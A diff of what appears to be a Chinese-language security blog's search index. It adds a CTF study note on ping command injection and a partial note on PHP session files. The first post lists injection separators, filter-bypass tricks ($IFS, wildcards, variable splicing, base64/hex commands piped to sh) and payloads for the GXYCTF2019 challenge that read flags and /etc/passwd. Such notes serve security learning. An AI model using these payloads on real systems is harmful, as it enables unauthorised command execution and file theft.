@@ -96,6 +96,175 @@
       </tags>
   </entry>
   <entry>
+    <title>Ping命令学习记录</title>
+    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
+<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
+<span id="more"></span>
+
+<p>首先测试所有的截断符号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
+
+<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>简单的flag就出来了，也可以配合其他的进行。</p>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
+
+<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
+<p>CTF里面：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>
+
+<p>只执行ls不执行前面的<br>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>
+
+<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
+<p>利用一个管道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>
+
+<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
+<p>利用多个管道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>
+
+<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
+<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>
+
+<p>先执行<code>ls</code>后执行<code>ping</code></p>
+<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
+<p>方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
+<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>
+
+<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
+<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
+<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
+<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
+<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
+<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>
+
+<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
+<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
+<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>
+
+
+<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
+<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
+<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
+<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>
+
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>*</code>在linux里面可以进行模糊匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>
+
+<p>进行模糊匹配php</p>
+<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
+<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
+<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
+<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
+<p><code>head</code>：只显示头几行</p>
+<p><code>tail</code>：只显示最后几行</p>
+<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
+<p><code>tailf</code>：类似于tail -f</p>
+<p><code>sort%20/flag</code> 读文件</p>
+<p><code>dir</code> 来查看当前目录文件</p>
+<p>也可以<code>c\at</code></p>
+<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
+<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+
+<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
+<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
+<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
+<p>构造<code>?ip=127.0.0.1;ls</code></p>
+<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
+<p>发现两个php文件</p>
+<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
+<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
+<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
+<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
+<p>总结：过滤的特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
+
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>
+
+<p>变量替换顺序，效果也不一样</p>
+<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>
+
+<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>
+
+<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p><code>|sh</code> 就是执行前面的echo脚本</p>
+<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
+
+<p>通配符</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+        <tag>Ping</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE学习记录</title>
     <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>前言：</p>
@@ -490,6 +659,105 @@
       </tags>
   </entry>
   <entry>
+    <title>包含session文件学习记录</title>
+    <url>/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
+<span id="more"></span>
+
+<h3 id="PHP-session-变量"><a href="#PHP-session-变量" class="headerlink" title="PHP session 变量"></a>PHP session 变量</h3><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于 HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。</p>
+<p>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p>
+<p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
+<h3 id="开始-PHP-session"><a href="#开始-PHP-session" class="headerlink" title="开始 PHP session"></a>开始 PHP session</h3><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
+<h3 id="存储-session-变量"><a href="#存储-session-变量" class="headerlink" title="存储 session 变量"></a>存储 session 变量</h3><p>session是一个数组，有键和值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>username</code>是键，<code>admin</code>是值</p>
+<p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">// 浏览量：1</span><br></pre></td></tr></table></figure>
+
+<p>在下面的实例中，我们创建了一个简单的 <code>page-view</code> 计数器。<code>isset() </code>函数检测是否已设置 “<code>views</code>“ 变量。如果已设置 “<code>views</code>“ 变量，我们累加计数器。如果 “<code>views</code>“ 不存在，则创建 “<code>views</code>“ 变量，并把它设置为 <code>1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=$_SESSION[&#x27;views&#x27;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="session变量存储地址"><a href="#session变量存储地址" class="headerlink" title="session变量存储地址"></a>session变量存储地址</h3><p>查看<code>session.save_path</code></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>session.save_path</td>
+<td>no value</td>
+<td>no value</td>
+</tr>
+</tbody></table>
+<p><code>session.save_path</code>为<code>no value</code>则表示存储在默认的<code>/tmp</code>或<code>/var/lib/php/session</code>目录下</p>
+<p>反之则会标明详细路径	</p>
+<h3 id="存放session变量文件名"><a href="#存放session变量文件名" class="headerlink" title="存放session变量文件名"></a>存放session变量文件名</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_[phpsessid]</span><br></pre></td></tr></table></figure>
+
+<p> phpsessid 在发送的请求的 <code>cookie</code> 字段中可以看到（保存在<code>cookie</code>里面，专门标识session）</p>
+<h3 id="销毁-session"><a href="#销毁-session" class="headerlink" title="销毁 session"></a>销毁 session</h3><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
+<p>unset() 函数用于释放指定的 session 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>您也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
